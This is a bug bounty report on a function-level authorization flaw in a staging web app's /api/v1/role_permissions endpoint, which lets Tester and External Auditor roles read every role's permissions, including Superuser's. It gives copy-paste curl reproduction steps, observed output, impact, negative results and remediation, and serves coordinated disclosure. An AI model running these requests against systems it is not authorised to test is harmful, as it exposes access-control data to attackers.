# BUG-018: Broken Function-Level Authorization — any internal role can read the complete RBAC permission matrix for every role, including Superuser

**Program:** Optro Managed Bug Bounty (private)
**Reporter:** zeno0 (zeno0@bugcrowdninja.com)
**Asset:** `https://bugbounty1.qe.optrostaging.ai`
**Build tested:** app_version **47.3.0-dev**, deployed 2026-11-10T17:56:45Z
**Date:** 2026-11-11
**Severity recommendation:** **P2 — Broken Function-Level Authorization / sensitive authorization-data disclosure**
**Header on all requests:** `X-Optro-Bug-Bounty: zeno0`

---

## 1. Summary

`GET /api/v1/role_permissions` is intended to return the caller's **own** role permission set. It does not scope the response to the caller.

- A **Third Party User (role 11)** correctly receives only its own 5,019 rows.
- **Owner (5), System Admin (2), Reviewer (3), Tester (4) and External Auditor (6)** each receive **70,266 rows covering all 14 roles** — the complete RBAC matrix for the entire product.
- The `?role_id=N` parameter lets **any** of those roles request **any** role's set directly. A **Tester (role 4)** and an **External Auditor (role 6)** can each retrieve **Superuser's (role 1) full 5,019-row permission set**.

This is a function-level authorization failure: the endpoint performs no check that the caller is entitled to view another role's permissions, and the collection is not scoped to the caller's role.

---

## 2. Root cause

Two defects:

1. **Unscoped collection.** `GET /role_permissions` returns every role's rows for roles 2–6, but correctly scopes role 11 to itself. The scoping logic is inconsistent — it appears to be a "limited role" special case rather than a general ownership check.
2. **No authorization on the `role_id` filter.** `?role_id=1` is honoured for every authenticated role with no check that the caller may view that role's permissions.

---

## 3. Reproduction — copy-paste

```bash
H="https://bugbounty1.qe.optrostaging.ai"
BB="X-Optro-Bug-Bounty: zeno0"

# Attacker: a plain Tester (role 4)
T=$(curl -s -X POST "$H/api/v1/users/login" -H "$BB" \
  -H "Content-Type: application/json" \
  -d '{"credentials":{"email":"tester@soxhub.com","password":"<pw>"}}' \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["session"]["token"])')
```

### Step 1 — the unscoped collection

```bash
curl -s "$H/api/v1/role_permissions" -H "token: $T" -H "$BB" \
  | python3 -c '
import sys,json
from collections import Counter
rp=json.load(sys.stdin)["role_permissions"]
print("rows:",len(rp))
print("role_ids:",dict(Counter(r["role_id"] for r in rp)))'
```

**Observed as Tester:**

```
rows: 70266
role_ids: {1: 5019, 2: 5019, 3: 5019, 4: 5019, 5: 5019, 6: 5019,
           10: 5019, 11: 5019, 12: 5019, 13: 5019, 14: 5019, 15: 5019,
           16: 5019, 17: 5019}
```

All 14 roles, 5,019 permission rows each.

### Step 2 — request Superuser's set directly

```bash
curl -s "$H/api/v1/role_permissions?role_id=1" -H "token: $T" -H "$BB" \
  | python3 -c '
import sys,json
from collections import Counter
rp=json.load(sys.stdin)["role_permissions"]
print("rows:",len(rp),"role_ids:",dict(Counter(r["role_id"] for r in rp)))'
```

**Observed as Tester:**

```
rows: 5019 role_ids: {1: 5019}
```

The complete Superuser permission set — 3,115 granted entries across `control.field`, `risk.field`, `modules`, `team_permission` and the rest of the schema.

### Step 3 — same from the weakest internal roles

| attacker role | `GET /role_permissions` | `?role_id=1` |
| --- | --- | --- |
| Owner (5) | 200, **70,266 rows / 14 roles** | 200, Superuser set |
| System Admin (2) | 200, **70,266 rows / 14 roles** | 200, Superuser set |
| Reviewer (3) | 200, **70,266 rows / 14 roles** | 200, Superuser set |
| **Tester (4)** | 200, **70,266 rows / 14 roles** | 200, Superuser set |
| **External Auditor (6)** | 200, **70,266 rows / 14 roles** | 200, Superuser set |
| Third Party User (11) | 200, **5,019 rows / own role only** | — |

---

## 4. What the leaked data contains

Per row: `id`, `role_id`, `key`, `section`, `value`, `scope`, `allow_scope_rules`, `core_modules`, `global_permission_id`, `created_at`, `updated_at`, `_permissions`.

- **1,807 distinct permission keys** across the schema.
- **5,019 rows per role**, 70,266 rows total.
- Values are the effective authorization state: `edit`, `show`, `hide`, `allow`, `deny`.
- Sections cover the full product surface: `control.field`, `risk.field`, `opsitem.field`, `team_permission`, `modules`, `key_risk_indicator.field`, and more.

This is a complete, machine-readable map of exactly what every role in the product can and cannot do — including the Superuser tier the attacker cannot otherwise reach.

---

## 5. Impact

- **Complete authorization-model disclosure.** An attacker obtains the exact permission boundaries of every role, which is the reconnaissance input for every other access-control attack: it tells them precisely which endpoints a given role is expected to reach, and therefore which denials are anomalies worth probing.
- **Reaches above the attacker's tier.** A Tester (role 4) and External Auditor (role 6) read Superuser's (role 1) permission set — the one role they cannot otherwise touch (see BUG-017, where Superuser is the only protected tier).
- **Not writable.** `PUT /role_permissions/{id}` → 403, `POST` → 404, `DELETE` → 404 for Third Party User. No privilege modification through this endpoint. (Confirmed — this is disclosure only.)
- **Volume and precision.** 70,266 rows of structured authorization state, not a summary or a guess.

**Honest ceiling:** this is an **information disclosure**, not a privilege escalation. The attacker cannot change permissions through this endpoint. Severity rests on the completeness and sensitivity of the authorization model exposed, and on the fact that it reaches a role tier above the attacker.

---

## 6. What was tested and did NOT work (honest negatives)

| vector | result |
| --- | --- |
| `PUT /api/v1/role_permissions/{id}` as Third Party User | **403 Forbidden** |
| `POST /api/v1/role_permissions` | **404** — no create route |
| `DELETE /api/v1/role_permissions/{id}` | **404** — no delete route |
| `?filter[role_id][eq]=N` | ignored, returns the caller's default set |
| `?filter[roleId][eq]=1` | returns role 1 (same as `?role_id=1`) |
| Third Party User (role 11) collection scope | **correctly scoped** to its own 5,019 rows |
| `usage/totals`, `webhook_urls`, `tiering_rules`, `weight_sets`, `evidence-search` | 403/422 uniformly — correctly gated |
| `assistant_knowledge_files`, `ml_generative_prompts`, `ml_generative_logs` | 200 for System Admin only — correctly gated |
| `api_access_logs`, `brand_identities`, `dip_configurations`, `automation_workflows` | 200 for all roles but **empty collections** — no data, not reported |

**Only `role_permissions` returns populated cross-role data to every internal role.**

---

## 7. Remediation

1. Scope `GET /role_permissions` to the caller's own role unless the caller holds an explicit administrative permission (e.g. `role:action.administer`).
2. Authorize the `role_id` filter: reject requests for a role the caller is not entitled to inspect.
3. Apply the same scoping rule that already protects role 11 to roles 2–6 — the current behaviour is inconsistent by role rather than by entitlement.
4. Consider returning only the caller's *effective* permissions rather than the full matrix, and gate the administrative view behind the admin UI permission.

---

## 8. Evidence / cleanup

- Read-only testing. No permission rows were modified (all write attempts 403/404).
- No business objects modified by this test.
- Disclosed from this engagement: files 2712/2726/2730/2732 deleted (BUG-015); issue 121 status changed; narrative 67 created; attachments 11207–11220 generated; several accounts' emails changed during BUG-017 testing and left in place at the operator's instruction.
